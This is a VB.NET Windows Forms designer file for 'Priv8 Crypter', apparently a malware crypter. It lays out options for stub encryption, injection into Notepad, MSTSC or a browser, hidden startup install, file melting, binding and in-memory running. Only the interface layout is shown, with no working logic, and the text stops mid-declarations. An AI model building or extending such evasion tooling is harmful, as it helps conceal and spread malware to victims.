<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Main
    Inherits System.Windows.Forms.Form

    'Form remplace la méthode Dispose pour nettoyer la liste des composants.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requise par le Concepteur Windows Form
    Private components As System.ComponentModel.IContainer

    'REMARQUE : la procédure suivante est requise par le Concepteur Windows Form
    'Elle peut être modifiée à l'aide du Concepteur Windows Form.  
    'Ne la modifiez pas à l'aide de l'éditeur de code.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Main))
        Me.TabControl1 = New System.Windows.Forms.TabControl
        Me.TabPage1 = New System.Windows.Forms.TabPage
        Me.Button3 = New System.Windows.Forms.Button
        Me.StubFile = New System.Windows.Forms.TextBox
        Me.GroupBox2 = New System.Windows.Forms.GroupBox
        Me.AES256 = New System.Windows.Forms.RadioButton
        Me.DES = New System.Windows.Forms.RadioButton
        Me.TripleDES = New System.Windows.Forms.RadioButton
        Me.AES192 = New System.Windows.Forms.RadioButton
        Me.AES128 = New System.Windows.Forms.RadioButton
        Me.RC4Mod = New System.Windows.Forms.RadioButton
        Me.RC2 = New System.Windows.Forms.RadioButton
        Me.Button2 = New System.Windows.Forms.Button
        Me.DataKey = New System.Windows.Forms.TextBox
        Me.GroupBox1 = New System.Windows.Forms.GroupBox
        Me.Button1 = New System.Windows.Forms.Button
        Me.TextFile = New System.Windows.Forms.TextBox
        Me.TabPage2 = New System.Windows.Forms.TabPage
        Me.GroupBox9 = New System.Windows.Forms.GroupBox
        Me.Label2 = New System.Windows.Forms.Label
        Me.TextDelay = New System.Windows.Forms.TextBox
        Me.GroupBox7 = New System.Windows.Forms.GroupBox
        Me.IcoCheck = New System.Windows.Forms.CheckBox
        Me.Button4 = New System.Windows.Forms.Button
        Me.IcoText = New System.Windows.Forms.TextBox
        Me.GroupBox5 = New System.Windows.Forms.GroupBox
        Me.CheckHide = New System.Windows.Forms.CheckBox
        Me.CheckStart = New System.Windows.Forms.CheckBox
        Me.GroupBox4 = New System.Windows.Forms.GroupBox
        Me.TextCustom = New System.Windows.Forms.TextBox
        Me.Custom = New System.Windows.Forms.CheckBox
        Me.GroupBox3 = New System.Windows.Forms.GroupBox
        Me.BrowserDefault = New System.Windows.Forms.RadioButton
        Me.ItSelf = New System.Windows.Forms.RadioButton
        Me.mstsc = New System.Windows.Forms.RadioButton
        Me.Notepad = New System.Windows.Forms.RadioButton
        Me.TabPage4 = New System.Windows.Forms.TabPage
        Me.GroupBox10 = New System.Windows.Forms.GroupBox
        Me.RunOnce = New System.Windows.Forms.CheckBox
        Me.MemRun = New System.Windows.Forms.CheckBox
        Me.GroupBox8 = New System.Windows.Forms.GroupBox
        Me.TextInstall = New System.Windows.Forms.TextBox
        Me.Label3 = New System.Windows.Forms.Label
        Me.GroupBox6 = New System.Windows.Forms.GroupBox
        Me.Binder = New System.Windows.Forms.CheckBox
        Me.BindBrowse = New System.Windows.Forms.Button
        Me.TextBind = New System.Windows.Forms.TextBox
        Me.TabPage5 = New System.Windows.Forms.TabPage
        Me.Button6 = New System.Windows.Forms.Button
        Me.PictureBox1 = New System.Windows.Forms.PictureBox
        Me.TabPage6 = New System.Windows.Forms.TabPage
        Me.Label4 = New System.Windows.Forms.Label
        Me.Label1 = New System.Windows.Forms.Label
        Me.State = New System.Windows.Forms.Label
        Me.TabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.GroupBox9.SuspendLayout()
        Me.GroupBox7.SuspendLayout()
        Me.GroupBox5.SuspendLayout()
        Me.GroupBox4.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        Me.GroupBox10.SuspendLayout()
        Me.GroupBox8.SuspendLayout()
        Me.GroupBox6.SuspendLayout()
        Me.TabPage5.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage6.SuspendLayout()
        Me.SuspendLayout()
        '
        'TabControl1
        '
        Me.TabControl1.Controls.Add(Me.TabPage1)
        Me.TabControl1.Controls.Add(Me.TabPage2)
        Me.TabControl1.Controls.Add(Me.TabPage4)
        Me.TabControl1.Controls.Add(Me.TabPage5)
        Me.TabControl1.Controls.Add(Me.TabPage6)
        Me.TabControl1.Font = New System.Drawing.Font("Sylfaen", 9.0!)
        Me.TabControl1.Location = New System.Drawing.Point(12, 15)
        Me.TabControl1.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(580, 235)
        Me.TabControl1.TabIndex = 0
        '
        'TabPage1
        '
        Me.TabPage1.Controls.Add(Me.Button3)
        Me.TabPage1.Controls.Add(Me.StubFile)
        Me.TabPage1.Controls.Add(Me.GroupBox2)
        Me.TabPage1.Controls.Add(Me.GroupBox1)
        Me.TabPage1.Location = New System.Drawing.Point(4, 25)
        Me.TabPage1.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TabPage1.Size = New System.Drawing.Size(572, 206)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Main :"
        Me.TabPage1.UseVisualStyleBackColor = True
        '
        'Button3
        '
        Me.Button3.Location = New System.Drawing.Point(459, 172)
        Me.Button3.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.Button3.Name = "Button3"
        Me.Button3.Size = New System.Drawing.Size(103, 25)
        Me.Button3.TabIndex = 5
        Me.Button3.Text = "Browse"
        Me.Button3.UseVisualStyleBackColor = True
        '
        'StubFile
        '
        Me.StubFile.Location = New System.Drawing.Point(44, 172)
        Me.StubFile.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.StubFile.Name = "StubFile"
        Me.StubFile.Size = New System.Drawing.Size(387, 23)
        Me.StubFile.TabIndex = 4
        Me.StubFile.Text = "Stub..."
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.AES256)
        Me.GroupBox2.Controls.Add(Me.DES)
        Me.GroupBox2.Controls.Add(Me.TripleDES)
        Me.GroupBox2.Controls.Add(Me.AES192)
        Me.GroupBox2.Controls.Add(Me.AES128)
        Me.GroupBox2.Controls.Add(Me.RC4Mod)
        Me.GroupBox2.Controls.Add(Me.RC2)
        Me.GroupBox2.Controls.Add(Me.Button2)
        Me.GroupBox2.Controls.Add(Me.DataKey)
        Me.GroupBox2.Location = New System.Drawing.Point(8, 78)
        Me.GroupBox2.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Padding = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.GroupBox2.Size = New System.Drawing.Size(561, 80)
        Me.GroupBox2.TabIndex = 3
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Key + Algorithm Encryption :"
        '
        'AES256
        '
        Me.AES256.AutoSize = True
        Me.AES256.Location = New System.Drawing.Point(316, 54)
        Me.AES256.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.AES256.Name = "AES256"
        Me.AES256.Size = New System.Drawing.Size(71, 20)
        Me.AES256.TabIndex = 9
        Me.AES256.Text = "AES-256"
        Me.AES256.UseVisualStyleBackColor = True
        '
        'DES
        '
        Me.DES.AutoSize = True
        Me.DES.Location = New System.Drawing.Point(401, 54)
        Me.DES.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.DES.Name = "DES"
        Me.DES.Size = New System.Drawing.Size(48, 20)
        Me.DES.TabIndex = 8
        Me.DES.Text = "DES"
        Me.DES.UseVisualStyleBackColor = True
        '
        'TripleDES
        '
        Me.TripleDES.AutoSize = True
        Me.TripleDES.Location = New System.Drawing.Point(463, 54)
        Me.TripleDES.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TripleDES.Name = "TripleDES"
        Me.TripleDES.Size = New System.Drawing.Size(54, 20)
        Me.TripleDES.TabIndex = 7
        Me.TripleDES.Text = "3DES"
        Me.TripleDES.UseVisualStyleBackColor = True
        '
        'AES192
        '
        Me.AES192.AutoSize = True
        Me.AES192.Location = New System.Drawing.Point(231, 54)
        Me.AES192.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.AES192.Name = "AES192"
        Me.AES192.Size = New System.Drawing.Size(71, 20)
        Me.AES192.TabIndex = 6
        Me.AES192.Text = "AES-192"
        Me.AES192.UseVisualStyleBackColor = True
        '
        'AES128
        '
        Me.AES128.AutoSize = True
        Me.AES128.Location = New System.Drawing.Point(146, 54)
        Me.AES128.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.AES128.Name = "AES128"
        Me.AES128.Size = New System.Drawing.Size(71, 20)
        Me.AES128.TabIndex = 5
        Me.AES128.Text = "AES-128"
        Me.AES128.UseVisualStyleBackColor = True
        '
        'RC4Mod
        '
        Me.RC4Mod.AutoSize = True
        Me.RC4Mod.Location = New System.Drawing.Point(85, 54)
        Me.RC4Mod.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.RC4Mod.Name = "RC4Mod"
        Me.RC4Mod.Size = New System.Drawing.Size(48, 20)
        Me.RC4Mod.TabIndex = 4
        Me.RC4Mod.Text = "RC4"
        Me.RC4Mod.UseVisualStyleBackColor = True
        '
        'RC2
        '
        Me.RC2.AutoSize = True
        Me.RC2.Checked = True
        Me.RC2.Location = New System.Drawing.Point(24, 54)
        Me.RC2.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.RC2.Name = "RC2"
        Me.RC2.Size = New System.Drawing.Size(48, 20)
        Me.RC2.TabIndex = 3
        Me.RC2.TabStop = True
        Me.RC2.Text = "RC2"
        Me.RC2.UseVisualStyleBackColor = True
        '
        'Button2
        '
        Me.Button2.Location = New System.Drawing.Point(451, 23)
        Me.Button2.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(103, 25)
        Me.Button2.TabIndex = 2
        Me.Button2.Text = "Generate"
        Me.Button2.UseVisualStyleBackColor = True
        '
        'DataKey
        '
        Me.DataKey.Location = New System.Drawing.Point(37, 25)
        Me.DataKey.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.DataKey.Name = "DataKey"
        Me.DataKey.Size = New System.Drawing.Size(387, 23)
        Me.DataKey.TabIndex = 1
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.Button1)
        Me.GroupBox1.Controls.Add(Me.TextFile)
        Me.GroupBox1.Location = New System.Drawing.Point(8, 9)
        Me.GroupBox1.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Padding = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.GroupBox1.Size = New System.Drawing.Size(561, 62)
        Me.GroupBox1.TabIndex = 0
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "File :"
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(451, 23)
        Me.Button1.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(103, 25)
        Me.Button1.TabIndex = 1
        Me.Button1.Text = "Browse"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'TextFile
        '
        Me.TextFile.Location = New System.Drawing.Point(37, 23)
        Me.TextFile.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TextFile.Name = "TextFile"
        Me.TextFile.Size = New System.Drawing.Size(387, 23)
        Me.TextFile.TabIndex = 0
        Me.TextFile.Text = "File..."
        '
        'TabPage2
        '
        Me.TabPage2.Controls.Add(Me.GroupBox9)
        Me.TabPage2.Controls.Add(Me.GroupBox7)
        Me.TabPage2.Controls.Add(Me.GroupBox5)
        Me.TabPage2.Controls.Add(Me.GroupBox4)
        Me.TabPage2.Controls.Add(Me.GroupBox3)
        Me.TabPage2.Location = New System.Drawing.Point(4, 25)
        Me.TabPage2.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TabPage2.Size = New System.Drawing.Size(572, 206)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Options :"
        Me.TabPage2.UseVisualStyleBackColor = True
        '
        'GroupBox9
        '
        Me.GroupBox9.Controls.Add(Me.Label2)
        Me.GroupBox9.Controls.Add(Me.TextDelay)
        Me.GroupBox9.Location = New System.Drawing.Point(190, 102)
        Me.GroupBox9.Name = "GroupBox9"
        Me.GroupBox9.Size = New System.Drawing.Size(118, 85)
        Me.GroupBox9.TabIndex = 4
        Me.GroupBox9.TabStop = False
        Me.GroupBox9.Text = "Delay :"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(87, 36)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(25, 16)
        Me.Label2.TabIndex = 1
        Me.Label2.Text = "MS"
        '
        'TextDelay
        '
        Me.TextDelay.Location = New System.Drawing.Point(16, 33)
        Me.TextDelay.Name = "TextDelay"
        Me.TextDelay.Size = New System.Drawing.Size(68, 23)
        Me.TextDelay.TabIndex = 0
        Me.TextDelay.Text = "5000"
        '
        'GroupBox7
        '
        Me.GroupBox7.Controls.Add(Me.IcoCheck)
        Me.GroupBox7.Controls.Add(Me.Button4)
        Me.GroupBox7.Controls.Add(Me.IcoText)
        Me.GroupBox7.Location = New System.Drawing.Point(331, 102)
        Me.GroupBox7.Name = "GroupBox7"
        Me.GroupBox7.Size = New System.Drawing.Size(223, 85)
        Me.GroupBox7.TabIndex = 3
        Me.GroupBox7.TabStop = False
        Me.GroupBox7.Text = "Icon :"
        '
        'IcoCheck
        '
        Me.IcoCheck.AutoSize = True
        Me.IcoCheck.Location = New System.Drawing.Point(18, 22)
        Me.IcoCheck.Name = "IcoCheck"
        Me.IcoCheck.Size = New System.Drawing.Size(55, 20)
        Me.IcoCheck.TabIndex = 2
        Me.IcoCheck.Text = "Icon ?"
        Me.IcoCheck.UseVisualStyleBackColor = True
        '
        'Button4
        '
        Me.Button4.Location = New System.Drawing.Point(148, 49)
        Me.Button4.Name = "Button4"
        Me.Button4.Size = New System.Drawing.Size(69, 24)
        Me.Button4.TabIndex = 1
        Me.Button4.Text = "Browse"
        Me.Button4.UseVisualStyleBackColor = True
        '
        'IcoText
        '
        Me.IcoText.Location = New System.Drawing.Point(18, 49)
        Me.IcoText.Name = "IcoText"
        Me.IcoText.Size = New System.Drawing.Size(119, 23)
        Me.IcoText.TabIndex = 0
        Me.IcoText.Text = "Icon..."
        '
        'GroupBox5
        '
        Me.GroupBox5.Controls.Add(Me.CheckHide)
        Me.GroupBox5.Controls.Add(Me.CheckStart)
        Me.GroupBox5.Location = New System.Drawing.Point(7, 102)
        Me.GroupBox5.Name = "GroupBox5"
        Me.GroupBox5.Size = New System.Drawing.Size(176, 85)
        Me.GroupBox5.TabIndex = 2
        Me.GroupBox5.TabStop = False
        Me.GroupBox5.Text = "Start-Up + Melt + Hidden :"
        '
        'CheckHide
        '
        Me.CheckHide.AutoSize = True
        Me.CheckHide.Location = New System.Drawing.Point(15, 48)
        Me.CheckHide.Name = "CheckHide"
        Me.CheckHide.Size = New System.Drawing.Size(138, 20)
        Me.CheckHide.TabIndex = 1
        Me.CheckHide.Text = "Melt File + Hide (+SH)"
        Me.CheckHide.UseVisualStyleBackColor = True
        '
        'CheckStart
        '
        Me.CheckStart.AutoSize = True
        Me.CheckStart.Location = New System.Drawing.Point(15, 22)
        Me.CheckStart.Name = "CheckStart"
        Me.CheckStart.Size = New System.Drawing.Size(143, 20)
        Me.CheckStart.TabIndex = 0
        Me.CheckStart.Text = "StartUp Hidden + Install"
        Me.CheckStart.UseVisualStyleBackColor = True
        '
        'GroupBox4
        '
        Me.GroupBox4.Controls.Add(Me.TextCustom)
        Me.GroupBox4.Controls.Add(Me.Custom)
        Me.GroupBox4.Location = New System.Drawing.Point(331, 7)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Size = New System.Drawing.Size(223, 79)
        Me.GroupBox4.TabIndex = 1
        Me.GroupBox4.TabStop = False
        Me.GroupBox4.Text = "Custom :"
        '
        'TextCustom
        '
        Me.TextCustom.Enabled = False
        Me.TextCustom.Location = New System.Drawing.Point(63, 45)
        Me.TextCustom.Name = "TextCustom"
        Me.TextCustom.Size = New System.Drawing.Size(127, 23)
        Me.TextCustom.TabIndex = 1
        Me.TextCustom.Text = "Custom.exe"
        '
        'Custom
        '
        Me.Custom.AutoSize = True
        Me.Custom.Location = New System.Drawing.Point(18, 20)
        Me.Custom.Name = "Custom"
        Me.Custom.Size = New System.Drawing.Size(64, 20)
        Me.Custom.TabIndex = 0
        Me.Custom.Text = "Custom"
        Me.Custom.UseVisualStyleBackColor = True
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.BrowserDefault)
        Me.GroupBox3.Controls.Add(Me.ItSelf)
        Me.GroupBox3.Controls.Add(Me.mstsc)
        Me.GroupBox3.Controls.Add(Me.Notepad)
        Me.GroupBox3.Location = New System.Drawing.Point(7, 7)
        Me.GroupBox3.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Padding = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.GroupBox3.Size = New System.Drawing.Size(301, 79)
        Me.GroupBox3.TabIndex = 0
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Injection :"
        '
        'BrowserDefault
        '
        Me.BrowserDefault.AutoSize = True
        Me.BrowserDefault.Font = New System.Drawing.Font("Sylfaen", 9.0!)
        Me.BrowserDefault.Location = New System.Drawing.Point(156, 48)
        Me.BrowserDefault.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.BrowserDefault.Name = "BrowserDefault"
        Me.BrowserDefault.Size = New System.Drawing.Size(139, 20)
        Me.BrowserDefault.TabIndex = 3
        Me.BrowserDefault.Text = "DEFAULT BROWSER"
        Me.BrowserDefault.UseVisualStyleBackColor = True
        '
        'ItSelf
        '
        Me.ItSelf.AutoSize = True
        Me.ItSelf.Font = New System.Drawing.Font("Sylfaen", 9.0!)
        Me.ItSelf.Location = New System.Drawing.Point(21, 48)
        Me.ItSelf.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.ItSelf.Name = "ItSelf"
        Me.ItSelf.Size = New System.Drawing.Size(62, 20)
        Me.ItSelf.TabIndex = 2
        Me.ItSelf.Text = "ITSELF"
        Me.ItSelf.UseVisualStyleBackColor = True
        '
        'mstsc
        '
        Me.mstsc.AutoSize = True
        Me.mstsc.Font = New System.Drawing.Font("Sylfaen", 9.0!)
        Me.mstsc.Location = New System.Drawing.Point(156, 20)
        Me.mstsc.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.mstsc.Name = "mstsc"
        Me.mstsc.Size = New System.Drawing.Size(89, 20)
        Me.mstsc.TabIndex = 1
        Me.mstsc.Text = "MSTSC.EXE"
        Me.mstsc.UseVisualStyleBackColor = True
        '
        'Notepad
        '
        Me.Notepad.AutoSize = True
        Me.Notepad.Checked = True
        Me.Notepad.Font = New System.Drawing.Font("Sylfaen", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Notepad.Location = New System.Drawing.Point(20, 20)
        Me.Notepad.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.Notepad.Name = "Notepad"
        Me.Notepad.Size = New System.Drawing.Size(107, 20)
        Me.Notepad.TabIndex = 0
        Me.Notepad.TabStop = True
        Me.Notepad.Text = "NOTEPAD.EXE"
        Me.Notepad.UseVisualStyleBackColor = True
        '
        'TabPage4
        '
        Me.TabPage4.Controls.Add(Me.GroupBox10)
        Me.TabPage4.Controls.Add(Me.GroupBox8)
        Me.TabPage4.Controls.Add(Me.GroupBox6)
        Me.TabPage4.Location = New System.Drawing.Point(4, 25)
        Me.TabPage4.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Padding = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TabPage4.Size = New System.Drawing.Size(572, 206)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "Binder :"
        Me.TabPage4.UseVisualStyleBackColor = True
        '
        'GroupBox10
        '
        Me.GroupBox10.Controls.Add(Me.RunOnce)
        Me.GroupBox10.Controls.Add(Me.MemRun)
        Me.GroupBox10.Location = New System.Drawing.Point(225, 106)
        Me.GroupBox10.Name = "GroupBox10"
        Me.GroupBox10.Size = New System.Drawing.Size(335, 74)
        Me.GroupBox10.TabIndex = 2
        Me.GroupBox10.TabStop = False
        Me.GroupBox10.Text = "Options :"
        '
        'RunOnce
        '
        Me.RunOnce.AutoSize = True
        Me.RunOnce.Enabled = False
        Me.RunOnce.Location = New System.Drawing.Point(198, 38)
        Me.RunOnce.Name = "RunOnce"
        Me.RunOnce.Size = New System.Drawing.Size(73, 20)
        Me.RunOnce.TabIndex = 1
        Me.RunOnce.Text = "RunOnce"
        Me.RunOnce.UseVisualStyleBackColor = True
        '
        'MemRun
        '
        Me.MemRun.AutoSize = True
        Me.MemRun.Enabled = False
        Me.MemRun.Location = New System.Drawing.Point(22, 22)
        Me.MemRun.Name = "MemRun"
        Me.MemRun.Size = New System.Drawing.Size(111, 20)
        Me.MemRun.TabIndex = 0
        Me.MemRun.Text = "MemoryRunning"
        Me.MemRun.UseVisualStyleBackColor = True
        '
        'GroupBox8
        '
        Me.GroupBox8.Controls.Add(Me.TextInstall)
        Me.GroupBox8.Controls.Add(Me.Label3)
        Me.GroupBox8.Location = New System.Drawing.Point(6, 106)
        Me.GroupBox8.Name = "GroupBox8"
        Me.GroupBox8.Size = New System.Drawing.Size(202, 74)
        Me.GroupBox8.TabIndex = 1
        Me.GroupBox8.TabStop = False
        Me.GroupBox8.Text = "Install :"
        '
        'TextInstall
        '
        Me.TextInstall.Enabled = False
        Me.TextInstall.Location = New System.Drawing.Point(78, 38)
        Me.TextInstall.Name = "TextInstall"
        Me.TextInstall.Size = New System.Drawing.Size(105, 23)
        Me.TextInstall.TabIndex = 1
        Me.TextInstall.Text = "WinUp.exe"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(15, 19)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(73, 16)
        Me.Label3.TabIndex = 0
        Me.Label3.Text = "Install Name :"
        '
        'GroupBox6
        '
        Me.GroupBox6.Controls.Add(Me.Binder)
        Me.GroupBox6.Controls.Add(Me.BindBrowse)
        Me.GroupBox6.Controls.Add(Me.TextBind)
        Me.GroupBox6.Location = New System.Drawing.Point(6, 18)
        Me.GroupBox6.Name = "GroupBox6"
        Me.GroupBox6.Size = New System.Drawing.Size(560, 82)
        Me.GroupBox6.TabIndex = 0
        Me.GroupBox6.TabStop = False
        Me.GroupBox6.Text = "File :"
        '
        'Binder
        '
        Me.Binder.AutoSize = True
        Me.Binder.Location = New System.Drawing.Point(41, 17)
        Me.Binder.Name = "Binder"
        Me.Binder.Size = New System.Drawing.Size(57, 20)
        Me.Binder.TabIndex = 2
        Me.Binder.Text = "Bind ?"
        Me.Binder.UseVisualStyleBackColor = True
        '
        'BindBrowse
        '
        Me.BindBrowse.Enabled = False
        Me.BindBrowse.Location = New System.Drawing.Point(440, 44)
        Me.BindBrowse.Name = "BindBrowse"
        Me.BindBrowse.Size = New System.Drawing.Size(114, 23)
        Me.BindBrowse.TabIndex = 1
        Me.BindBrowse.Text = "Browse |*.*"
        Me.BindBrowse.UseVisualStyleBackColor = True
        '
        'TextBind
        '
        Me.TextBind.Location = New System.Drawing.Point(18, 44)
        Me.TextBind.Name = "TextBind"
        Me.TextBind.Size = New System.Drawing.Size(416, 23)
        Me.TextBind.TabIndex = 0
        '
        'TabPage5
        '
        Me.TabPage5.Controls.Add(Me.Button6)
        Me.TabPage5.Controls.Add(Me.PictureBox1)
        Me.TabPage5.Location = New System.Drawing.Point(4, 25)
        Me.TabPage5.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Padding = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TabPage5.Size = New System.Drawing.Size(572, 206)
        Me.TabPage5.TabIndex = 4
        Me.TabPage5.Text = "Build :"
        Me.TabPage5.UseVisualStyleBackColor = True
        '
        'Button6
        '
        Me.Button6.Location = New System.Drawing.Point(164, 159)
        Me.Button6.Name = "Button6"
        Me.Button6.Size = New System.Drawing.Size(221, 28)
        Me.Button6.TabIndex = 1
        Me.Button6.Text = "Crypt File !"
        Me.Button6.UseVisualStyleBackColor = True
        '
        'PictureBox1
        '
        Me.PictureBox1.Image = Global.Priv8_Crypter__By_Yahik0_.My.Resources.Resources.build_128
        Me.PictureBox1.Location = New System.Drawing.Point(205, 7)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(130, 137)
        Me.PictureBox1.TabIndex = 0
        Me.PictureBox1.TabStop = False
        '
        'TabPage6
        '
        Me.TabPage6.Controls.Add(Me.Label4)
        Me.TabPage6.Location = New System.Drawing.Point(4, 25)
        Me.TabPage6.Name = "TabPage6"
        Me.TabPage6.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage6.Size = New System.Drawing.Size(572, 206)
        Me.TabPage6.TabIndex = 5
        Me.TabPage6.Text = "Scan :"
        Me.TabPage6.UseVisualStyleBackColor = True
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Font = New System.Drawing.Font("Sylfaen", 27.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label4.ForeColor = System.Drawing.Color.Crimson
        Me.Label4.Location = New System.Drawing.Point(130, 78)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(280, 48)
        Me.Label4.TabIndex = 0
        Me.Label4.Text = "Coming Soon ..."
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Font = New System.Drawing.Font("Sylfaen", 9.0!)
        Me.Label1.Location = New System.Drawing.Point(35, 258)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(75, 16)
        Me.Label1.TabIndex = 1
        Me.Label1.Text = "Status/Error :"
        '
        'State
        '
        Me.State.AutoSize = True
        Me.State.ForeColor = System.Drawing.Color.Lime
        Me.State.Location = New System.Drawing.Point(111, 258)
        Me.State.Name = "State"
        Me.State.Size = New System.Drawing.Size(108, 16)
        Me.State.TabIndex = 2
        Me.State.Text = "No Error Detected !"
        '
        'Main
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(7.0!, 16.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(607, 283)
        Me.Controls.Add(Me.State)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.TabControl1)
        Me.Font = New System.Drawing.Font("Sylfaen", 9.0!)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.MaximizeBox = False
        Me.Name = "Main"
        Me.ShowIcon = False
        Me.Text = "Priv8 Crypter [By Yahik0]"
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.GroupBox9.ResumeLayout(False)
        Me.GroupBox9.PerformLayout()
        Me.GroupBox7.ResumeLayout(False)
        Me.GroupBox7.PerformLayout()
        Me.GroupBox5.ResumeLayout(False)
        Me.GroupBox5.PerformLayout()
        Me.GroupBox4.ResumeLayout(False)
        Me.GroupBox4.PerformLayout()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        Me.TabPage4.ResumeLayout(False)
        Me.GroupBox10.ResumeLayout(False)
        Me.GroupBox10.PerformLayout()
        Me.GroupBox8.ResumeLayout(False)
        Me.GroupBox8.PerformLayout()
        Me.GroupBox6.ResumeLayout(False)
        Me.GroupBox6.PerformLayout()
        Me.TabPage5.ResumeLayout(False)
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage6.ResumeLayout(False)
        Me.TabPage6.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents TabControl1 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
